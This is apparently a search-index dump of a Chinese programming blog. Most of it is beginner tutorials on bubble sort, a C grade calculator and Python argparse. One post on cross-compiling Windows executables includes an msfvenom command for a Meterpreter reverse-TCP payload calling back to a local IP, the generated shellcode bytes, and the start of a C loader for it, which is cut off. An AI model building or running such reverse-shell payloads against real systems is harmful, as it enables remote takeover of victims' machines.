range(1,len(arr)): def sort(arr): for i in range(1,len(arr)): 接下来在上一个循环里面再创建一个循环, 用 for 从 j 开始循环 arr 的长度 - 1 - i 遍, 所以这里 range() 要从 0 开始了: for j in range(0, len(arr) - i): def sort(arr): for i in range(1,len(arr)): for j in range(0, len(arr) - i): 然后我们在j这个循环里面开始比对元素, 如果arr[j]大于arr[j+1]则将二者的值相互交换一下： if (arr[j] \u003e arr[j+1]): arr[j],arr[j+1] = arr[j+1],arr[j] def sort(arr): for i in range(1,len(arr)): for j in range(0,len(arr) - i): if (arr[j] \u003e arr[j+1]): arr[j],arr[j+1] = arr[j+1],arr[j] 最后我们返回转换好的数组: return arr def sort(arr): for i in range(1,len(arr)): for j in range(0,len(arr) - i): if (arr[j] \u003e arr[j+1]): arr[j],arr[j+1] = arr[j+1],arr[j] return arr 这样以来排列函数就写好了，接下来我们按照题目的要求输入四个整数再输出看看: arr = [73837372882, 2772828191919, 82828282828,828282728181] print(sort(arr)) 输出: [73837372882, 82828282828, 828282728181, 2772828191919] 很明显是按从小到大的数据排列的。:) 这样一来 Python 就成功实现冒泡排序了。 ","date":"2021-06-15","objectID":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/:1:0","tags":["C语言","Python","编程","冒泡排序","排序算法"],"title":"冒泡排序的尝试","uri":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/"},{"categories":["编程"],"content":"C 接下来我们使用 C 语言来实现一下，不过在此之前我们看看 C 语言的 for(){} 语句是怎样的。 for ( init; condition; increment ) { statement(s); } for 循环的控制流： init 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。 接下来，会判断 condition。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。 在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。 条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。 ——C for 循环 | 菜鸟教程 这跟 Python 又不一样了，不过流程大致上是相同的。 :) 由于 C 语言没有 Python 当中的 len() 函数来取长度，因此我们得在循环函数提供长度参数int len()了。 而这个参数的值我们需要利用sizeof()函数计算地址来算。 int len = sizeof(arr)/sizeof(*arr); 不过这是循环函数之外的事情，回写在主函数里面。 接下来我们先写循环函数,声明函数 void sort(){}, 规定两个参数 int arr[] 和 int len： #include\u003cstdio.h\u003e void sort(int arr[], int len) { } 接下来定义三个整型变量，分别为 i,j,temp， 由于语法不同，在 C 语言中变量 temp 将作为交换两个数组元素值而设置的中间值： int i,j,temp; #include\u003cstdio.h\u003e void sort() { int i,j,temp; } 接下来创建 for 循环, 规定 i 从 0 开始一增加，直到不满足 i \u003c len - 1; 为止并跳出循环： for (i = 0; i \u003c len - 1; i++) { } #include\u003cstdio.h\u003e void sort() { int i,j,temp; for (i = 0; i \u003c len - 1; i++) { } } 然后在上一个 for 循环里面再创建一个 for 循环，规定 j 从 0 开始一直增加，直到不满足 j \u003c len - 1 - i 为止并跳出循环： for (j = 0;j \u003c len - 1 - i;j++) { } #include\u003cstdio.h\u003e void sort() { int i,j,temp; for (i = 0; i \u003c len - 1; i++) { for (j = 0;j \u003c len - 1 - i;j++) { } } } 然后就开始在循环圈里比对大小和交换了,如果 arr[j] 大于 arr[j + 1]，则将他们的值交换，先把 arr[j] 的值赋给 temp, 再把 arr[j+1] 的值赋给 arr[j], 最后将 temp 的值赋给 arr[j+1]: if (arr[j] \u003e arr[j+1]) { temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; } #include\u003cstdio.h\u003e void sort() { int i,j,temp; for (i = 0; i \u003c len - 1; i++) { for (j = 0;j \u003c len - 1 - i;j++) { if (arr[j] \u003e arr[j+1]) { temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; } } } } 这样以来排序函数就写好了，接下来我们来写主函数里面的东西, 先定义主函数： #include\u003cstdio.h\u003e int main() { } 题目要我们输入四个整数，我们定义四个整形变量，并通过scanf() 获取输入值并分别赋给他们: int n1,n2,n3,n4; printf(\"please type four numbers:\"); scanf(\"%d%d%d%d\",n1,n2,n3,n4); #include\u003cstdio.h\u003e int main() { int n1,n2,n3,n4; printf(\"please type four numbers:\"); scanf(\"%d%d%d%d\",n1,n2,n3,n4); } 接下来定义整形数组int arr[]={};，将得到的这四个整数加入这个数组: int arr[] = {n1,n2,n3,n4}; #include\u003cstdio.h\u003e int main() { int n1,n2,n3,n4; printf(\"please type four numbers:\"); scanf(\"%d%d%d%d\",n1,n2,n3,n4); int arr[] = {n1,n2,n3,n4}; } 然后定义整形变量 len, 计算数组长度并赋值给它: int len = (int)sizeof(arr) / sizeof(*arr); #include\u003cstdio.h\u003e int main() { int n1,n2,n3,n4; printf(\"please type four numbers:\"); scanf(\"%d%d%d%d\",n1,n2,n3,n4); int arr[] = {n1,n2,n3,n4}; int len = (int)sizeof(arr) / sizeof(*arr); } 然后我们调用刚刚写好的排序函数sort();： sort(arr,len); #include\u003cstdio.h\u003e int main() { int n1,n2,n3,n4; printf(\"please type four numbers:\"); scanf(\"%d%d%d%d\",n1,n2,n3,n4); int arr[] = {n1,n2,n3,n4}; int len = (int)sizeof(arr) / sizeof(*arr); sort(arr,len); } 此时 arr[] 各项元素的位置都按照以小到大的顺序排列好了。最后我们需要定义一个用来确定位置的整形变量 i 再将这个数组用 for 循环输出就好了。 创建 for 循环, 规定 i 从 0 开始一直增加直到不满足 i \u003c len 为止并跳出，每循环一次，输出一个以i为位置的元素： int i; for(i = 0; i \u003c len; i++) { printf(\"%d \",arr[i]); } #include\u003cstdio.h\u003e int main() { int n1,n2,n3,n4; printf(\"please type four numbers:\"); scanf(\"%d%d%d%d\",n1,n2,n3,n4); int arr[] = {n1,n2,n3,n4}; int len = (int)sizeof(arr) / sizeof(*arr); sort(arr,len); for(i = 0; i \u003c len; i++) { printf(\"%d \",arr[i]); } return 0; } (还有不要忘了 return 0;) 接下来进行编译和运行 $ gcc 文件名.c -o /tmp/文件名 $ /tmp/文件名 输出: type four numbers: 54 87 25 65 25 54 65 87 很明显，每个数字都是按照从小到大的顺序排列的，C 语言下的冒泡排序就成功实现了。:) 完整代码 ","date":"2021-06-15","objectID":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/:2:0","tags":["C语言","Python","编程","冒泡排序","排序算法"],"title":"冒泡排序的尝试","uri":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/"},{"categories":["编程"],"content":"Python Github: drafts/bbsort.py at main · WeepingDogel/drafts · GitHub ''' 冒泡排序 Python 实例 By WeepingDogel ''' def sort(arr): for i in range(1,len(arr)): for j in range(0, len(arr) - i): if arr[j] \u003e arr[j+1]: arr[j],arr[j+1] = arr[j+1],arr[j] return arr arr = [73837372882, 2772828191919, 82828282828,828282728181] print(sort(arr)) ","date":"2021-06-15","objectID":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/:3:0","tags":["C语言","Python","编程","冒泡排序","排序算法"],"title":"冒泡排序的尝试","uri":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/"},{"categories":["编程"],"content":"C Github: drafts/bbsort.c at main · WeepingDogel/drafts · GitHub /* 冒泡排序 C 语言实例 By WeepingDogel */ #include\u003cstdio.h\u003e void sort(int arr[],int len) { int i,j,temp; for(i = 0; i \u003c len - 1; i++) { for(j = 0; j \u003c len - 1 - i;j++) { if (arr[j] \u003e arr[j + 1]) { temp = arr[j]; arr[j] = arr[j+1]; arr[j + 1] =temp; } } } } int main() { int n1,n2,n3,n4; printf(\"type four numbers:\\n\"); scanf(\"%d%d%d%d\",\u0026n1,\u0026n2,\u0026n3,\u0026n4); int arr[] = {n1,n2,n3,n4}; int len = (int)sizeof(arr) / sizeof(*arr); sort(arr,len); int i; for(i = 0; i \u003c len; i++) { printf(\"%d \",arr[i]); } return 0; } 参考链接 C 数组 | 菜鸟教程 C for 循环 | 菜鸟教程 C 基本语法 | 菜鸟教程 C 数据类型 | 菜鸟教程 Python for 循环语句 | 菜鸟教程 冒泡排序 - 维基百科，自由的百科全书 c语言获取数组长度的三种方法 - 云+社区 - 腾讯云 ","date":"2021-06-15","objectID":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/:4:0","tags":["C语言","Python","编程","冒泡排序","排序算法"],"title":"冒泡排序的尝试","uri":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/"},{"categories":["编程"],"content":"C 语言的小实例。","date":"2021-06-15","objectID":"/zh-cn/posts/%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E5%88%86%E6%95%B0%E5%88%A4%E6%96%AD%E8%AF%A5%E5%88%86%E6%95%B0%E7%9A%84%E8%AF%84%E7%BA%A7/","tags":["C语言","编程","实例","示例","教程"],"title":"输入一个分数判断该分数的评级","uri":"/zh-cn/posts/%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E5%88%86%E6%95%B0%E5%88%A4%E6%96%AD%E8%AF%A5%E5%88%86%E6%95%B0%E7%9A%84%E8%AF%84%E7%BA%A7/"},{"categories":["编程"],"content":"序 好久没玩过 C 了， 昨晚看到一个题: 输入一个分数，自动判断该分数的评级 要求: 使用 switch(){} 过程 首先我肯定要获取这个分数然后赋值给某个变量，用 scanf(); 就可以做到 #include\u003cstido.h\u003e int main() { float score; printf(\"Please type a score:\\n\"); scanf(\"%f\", \u0026score); } 其次我得确认这个数字小于 100 并大于 0 满分100分 最低0分 之前写过的一篇文章里就提到了 \u0026\u0026 这个符号 因此直接 if(score \u003c= 100 \u0026\u0026 \u003e= 0){} 即可 #include \u003cstdio.h\u003e int main() { float score; printf(\"Please type a score:\\n\"); scanf(\"%f\", \u0026score); if(score \u003c= 100 \u0026\u0026 score \u003e= 0) { } } 嗯.. 现在分数来源问题就解决了，如果输入的分数大于100或者小于0, 直接报错 printf(\"The score %.2f is an Error Value!\", score); #include \u003cstdio.h\u003e int main() { float score; printf(\"Please type a score:\\n\"); scanf(\"%f\", \u0026score); if(score \u003c= 100 \u0026\u0026 score \u003e= 0) { } else { printf(\"The score %.2f is an Error Value!\", score); } } 好接下来要做的是把不同的分数评为不同的等级，先说说不同分数对应的字母吧: 90到100分为 A 90分以下80分以上为 B 80分以下70分以上为 C 70分以下60分以上为 D 60分以下为 E 这些字母将会用一个单字符型变量来存储，我把它命名为 grade 并加入代码中。 char grade #include \u003cstdio.h\u003e int main() { float score; char grade; printf(\"Please type a score:\\n\"); scanf(\"%f\", \u0026score); if(score \u003c= 100 \u0026\u0026 score \u003e= 0) { } else { printf(\"The score %.2f is an Error Value!\", score); } } 那怎样判断分数对应的级别？ 其实我们可以用 if(){} 来写的，但是要求使用 switch(); switch() 语句是流程控制中的判断语句之一，具体解释如下: 一个 switch 语句允许测试一个变量等于多个值时的情况。每个值称为一个 case，且被测试的变量会对每个 switch case 进行检查。 switch 语句必须遵循下面的规则： switch 语句中的 expression 是一个常量表达式，必须是一个整型或枚举类型。 在一个 switch 中可以有任意数量的 case 语句。每个 case 后跟一个要比较的值和一个冒号。 case 的 constant-expression 必须与 switch 中的变量具有相同的数据类型，且必须是一个常量或字面量。 当被测试的变量等于 case 中的常量时，case 后跟的语句将被执行，直到遇到 break 语句为止。 当遇到 break 语句时，switch 终止，控制流将跳转到 switch 语句后的下一行。 不是每一个 case 都需要包含 break。如果 case 语句不包含 break，控制流将会 继续 后续的 case，直到遇到 break 为止。 一个 switch 语句可以有一个可选的 default case，出现在 switch 的结尾。default case 可用于在上面所有 case 都不为真时执行一个任务。default case 中的 break 语句不是必需的。 ——C switch 语句 | 菜鸟教程 总感觉这个解释已经很容易看懂了…所以我不想用自己的话说一遍.. 这样会写得很长并且看起来很水.. 我们大概就是要把取来的分数除以10然后转化成整数，再把这个整数进行逐一比对。 switch ((int)(score / 10)) { case 10: case 9: grade = 'A'; break; case 8: grade = 'B'; break; case 7: grade = 'C'; break; case 6: grade = 'D'; break; default: grade = 'E'; break; } 接下来直接输出分数和字母就好了。 printf(\"The score %.2f is grade %c .\\n\",score,grade); 这些都写进上面那个 if(){} 语句里面 看下面的完整代码吧～ 完整代码 到 Github 看: drafts/a.c at main · WeepingDogel/drafts · GitHub 这里看: /* 分数判断成绩 ABCDEF By WeepingDogel */ #include \u003cstdio.h\u003e int main() { float score; char grade; printf(\"please input your score:\\n\"); scanf(\"%f\",\u0026score); if (score \u003c= 100 \u0026\u0026 score \u003e= 0) { switch ((int)(score / 10)) { case 10: case 9: grade = 'A'; break; case 8: grade = 'B'; break; case 7: grade = 'C'; break; case 6: grade = 'D'; break; default: grade = 'E'; break; } printf(\"The score %.2f is grade %c .\\n\",score,grade); } else { printf(\"The score %.2f is an Error Value!\", score); } return 0; } 一些要注意的细节 作为初学者的我认为这些细节必须要知道，如果你也是初学者也会问这些。 %.2f 是什么意思？ 意思是取到两位浮点数，也就是取两位小数啦 这里贴出完整的解释 C 库函数 int printf(const char *format, …) 发送格式化输出到标准输出 stdout。 printf()函数的调用格式为: printf(\"\u003c格式化字符串\u003e\", \u003c参量表\u003e); 下面是 printf() 函数的声明。 int printf(const char *format, ...) format – 这是字符串，包含了要被写入到标准输出 stdout 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是 %[flags][width][.precision][length]specifier，具体讲解如下： 附加参数 – 根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。 ——C 库函数 – printf() | 菜鸟教程 为什么 scanf() 里面那个score前面要加\u0026? 这个… 读到的是内存地址，所以..~ C 库函数 int scanf(const char *format, …) 从标准输入 stdin 读取格式化输入。 … \u0026a、\u0026b、\u0026c 中的 \u0026 是地址运算符，分别获得这三个变量的内存地址。 %d%d%d 是按十进值格式输入三个数值。输入时，在两个数据之间可以用一个或多个空格、tab 键、回车键分隔。 ——C 库函数 – scanf() | 菜鸟教程 为什么 case 10： 和 case 9: 之间是空着的？ 这个啊，因为上面说了需求是 100 和 90 多分都是 A, 要实现这个需求就得利用 switch（）{} 的这个规则: 当遇到 break 语句时，switch 终止，控制流将跳转到 switch 语句后的下一行。 不是每一个 case 都需要包含 break。如果 case 语句不包含 break，控制流将会 继续 后续的 case，直到遇到 break 为止。 ——C switch 语句 | 菜鸟教程 参考链接 C switch 语句 | 菜鸟教程 C 库函数 – printf() | 菜鸟教程 C 库函数 – scanf() | 菜鸟教程 ","date":"2021-06-15","objectID":"/zh-cn/posts/%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E5%88%86%E6%95%B0%E5%88%A4%E6%96%AD%E8%AF%A5%E5%88%86%E6%95%B0%E7%9A%84%E8%AF%84%E7%BA%A7/:0:0","tags":["C语言","编程","实例","示例","教程"],"title":"输入一个分数判断该分数的评级","uri":"/zh-cn/posts/%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E5%88%86%E6%95%B0%E5%88%A4%E6%96%AD%E8%AF%A5%E5%88%86%E6%95%B0%E7%9A%84%E8%AF%84%E7%BA%A7/"},{"categories":["编程"],"content":"Python 学习笔记之 ArgParse 的使用，可以使 Python 程序在命令行中加选项...","date":"2021-05-16","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——ArgParse","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/"},{"categories":["编程"],"content":"序 为了使 TitleGetter 更加灵活，我打算将 list.txt 和输出文件由用户自定， 因此这需要用到命令行选项… 就像一些我们常用到的软件一样，比如 pacman 因此谷歌了一下，了解到了 ArgParse 这个东西 The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically generates help and usage messages and issues errors when users give the program invalid arguments. From: argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation 然后我就试着敲了一个文件.. 运行出来的结果是这样的 那么接下来稍微整理一下相关的笔记吧….. 创建 Parser \u0026\u0026 添加选项 在一切开始之前，我们需要使用 argparse 库里面的 ArgumentParser 用法来创建一个变量，命名为 ‘parser’ import argparse parser = argparse.ArgumentParser(description='') 这里有个参数 description=''， 这里是写一些说明用的… 比如我们写上 import argparse parser = argparse.ArgumentParser(description='Welcome') 顺便我们需要写上一些需要的选项～ parser.add_argument() 使用这个就可以了 里面需要加上一些东西, 比如 -a、 --about 这些选项的使用形式 最后加上 args = parser.parse_args() import argparse parser = argparse.ArgumentParser(description='Welcome') parser.add_argument('-a','--about', help='Show the about') args = parser.parse_args() 这时我们已经可以加上 -h 来看看效果了 $ python a.py -h usage: a.py [-h] [-a ABOUT] Welcome optional arguments: -h, --help show this help message and exit -a ABOUT, --about ABOUT Show the about 那么这里整理一下常用的这么几个参数 default 没有设置任何参数情况下的默认参数 parser.add_argument('-a','--about', help='Show the about', defualt='text.txt') 如果用户没有设置这个参数则会自动提供一个默认的 help 给对应的选项添加说明文字 required 用于决定这个参数是否一定需要设置 如果设置了 required=True, 在运行时如果不设置这个参数就会报错 parser.add_argument('-a','--about', required=True) $ python a.py usage: a.py [-h] -a ABOUT a.py: error: the following arguments are required: -a/--about 调用获取到的选项参数 接下来我们要做的是，将获取到的参数运用起来。 我们知道，当在命令行中给选项后面写上了一些东西，那么程序会默认地作为字符串而获取它，这时我们就要拿这获得的东西做我们想要做的事 我简单地写了个能够将一个文件的内容写到另一个文件的脚本 import argparse print(''' By WeepingDogel ''') def GetParser(): parser = argparse.ArgumentParser(description='Help', epilog='A new testing program.') parser.add_argument('-o','--output', help='Output file',default='test.txt' , required=True) parser.add_argument('-r','--read',help='read a file', required=True) return parser def Write(content, filename): f = open(filename,\"a\") f.write(content) f.close() print(filename + ' has been written') def Read(filename): f = open(filename) text = f.read() return text def Main(): parser = GetParser() args = parser.parse_args() Write(Read(args.read),args.output) Main() 好的不难看出，我们得到的东西会到这个 args 变量里面去，因为它是由 parser.parse_args() 这个函数所返回的内容所赋值而来的，而取出对应选项参数得到的内容则是 args.选项名 比如我们要获取写出的文件名 $ vim b.py import argparse parser = argparse.ArgumentParser(description='Help', epilog='A new testing program.') parser.add_argument('-o','--output', help='Output file',default='test.txt' , required=True) args = parser.parse_args() filename = args.output print(\"The filename is \"+ filename) $ python b.py -o WeepingDogel The filename is WeepingDogel 可见我们已经获取到这个字符串 “WeepingDogel” 了。 同理，需要读取的文件名也是一样的 args.read 这么写就可以了～ 接下来用截图来看看上面那一堆代码的效果： 简单的创建与使用就是如此… 当然还有更多的用法需要探索.. 结语 那么我接下来要做的就是将这些更新进 TitleGetter 啦！ 以后就不需要在配置文件里设置 list.txt 的位置了！ 输出的文件位置也不需要固定了！！ 参考链接 argparse简要用法总结 | Yunfeng’s Simple Blog argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation ","date":"2021-05-16","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/:0:0","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——ArgParse","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/"},{"categories":["编程"],"content":"试着在 Linux 下将 C 语言代码文件编译成 Windows 可以跑的 exe 文件~","date":"2021-05-06","objectID":"/zh-cn/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/","tags":["C 语言","交叉编译","编程","gcc","Windows","渗透测试","黑客"],"title":"尝试在 Linux 下编译 exe 可执行文件","uri":"/zh-cn/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/"},{"categories":["编程"],"content":"序 最近一直在想有没有什么办法可以在 Linux 环境下编译 Windows 中可以运行的 exe 文件，由于自己没有 Windows 环境， 就算开虚拟机也多多少少有些不方便.. 于是就去谷歌了一下.. 发现办法是有的. 这种办法叫做交叉编译, 要用到交叉编译器 我们看看维基百科上怎么说 交叉编译器（英语：Cross compiler）是指一个在某个系统平台下可以产生另一个系统平台的可执行文件的编译器。交叉编译器在目标系统平台（开发出来的应用程序序所运行的平台）难以或不容易编译时非常有用。 交叉编译器的存在对于从一个开发主机为多个平台编译代码是非常有必要的。直接在平台上编译有时行不通，例如在一个嵌入式系统的单片机 ，因为它们没有操作系统，所以直接编译行不通。 交叉编译器和源代码至源代码编译器不同，交叉编译器用于二进制代码的跨平台软件开发，而源到源编译器是将某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器，但两者都是编程工具。 rel: https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8 概念就是这样.. mingw-w64 这大概是个交叉编译器了 看看官网怎么说 Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems. It has forked it in 2007 in order to provide support for 64 bits and new APIs. It has since then gained widespread use and distribution. rel: https://mingw-w64.org/doku.php 好的接下来我们就安装它， 这里 Arch 就直接从 pacman 装上了 $ sudo pacman -S mingw-w64 开始编译 那么， 装完之后就可以开始编译了 我打算编译一个 payload 试试看，嘿嘿 首先我们先用 msfvenom 生成一段 shellcode $ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=3333 -f c \u003e\u003e shellcode.c unsigned char buf[] = \"\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\\x64\\x8b\\x52\\x30\" \"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x0f\\xb7\\x4a\\x26\\x31\\xff\\x8b\\x72\\x28\" \"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49\" \"\\x75\\xef\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\" \"\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x8b\\x48\\x18\\x8b\\x58\\x20\\x50\\x01\\xd3\" \"\\x85\\xc9\\x74\\x3c\\x31\\xff\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xac\" \"\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\" \"\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\" \"\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\" \"\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\" \"\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\" \"\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\" \"\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\x6d\\xa6\\x24\\x38\\x68\\x02\" \"\\x00\\x35\\x16\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\" \"\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\" \"\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\" \"\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\" \"\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\" \"\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\" \"\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68\\x00\" \"\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\" \"\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\" \"\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\" \"\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\"; 然后编写我们的代码 #include\u003cwindows.h\u003e #include\u003cstdio.h\u003e unsigned char shellcode[] = \"\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\" \"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x0f\\xb7\\x4a\\x26\\x8b\\x72\\x28\\x31\\xff\" \"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49\" \"\\x75\\xef\\x52\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x57\\x01\\xd0\\x8b\\x40\\x78\" \"\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\" \"\\x85\\xc9\\x74\\x3c\\x31\\xff\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xc1\" \"\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\" \"\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\" \"\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\" \"\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\" \"\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\" \"\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\" \"\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\x00\\x70\\x68\\x02\" \"\\x00\\x0d\\x05\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\" \"\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\" \"\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\" \"\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\" \"\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\" \"\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\" \"\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68\\x00\" \"\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0","date":"2021-05-06","objectID":"/zh-cn/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/:0:0","tags":["C 语言","交叉编译","编程","gcc","Windows","渗透测试","黑客"],"title":"尝试在 Linux 下编译 exe 可执行文件","uri":"/zh-cn/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/"},{"categories":["编程"],"content":"一言难尽...","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["编程"],"content":"序 心血来潮想玩玩 GTK, 于是.. 我就尝试了一下， 用 C 试着捏了一个。 总的来说其实不是很难， 也是套用函数就好… 但是，很长.. 真的很长.. 